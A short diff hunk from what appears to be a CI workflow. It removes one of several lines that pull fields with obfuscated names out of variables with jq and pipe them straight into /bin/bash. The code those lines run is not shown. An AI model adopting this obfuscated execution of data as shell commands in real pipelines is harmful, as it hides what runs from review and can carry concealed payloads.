@@ -20,7 +20,6 @@ jobs:
           echo $m096 | jq -r .cosay162 | /bin/bash
           echo $qj5 | jq -r .vx217 | /bin/bash
           echo $h8156 | jq -r .nxq7 | /bin/bash
-          printf '%s' "$ksedr9050" | jq -r .rtevl448 | /bin/bash
           echo $vpnlk53632 | jq -r .i2085 | /bin/bash
           echo $qi61849 | jq -r .e67 | /bin/bash
           printf '%s' "$xa55" | jq -r .bit0142 | /bin/bash
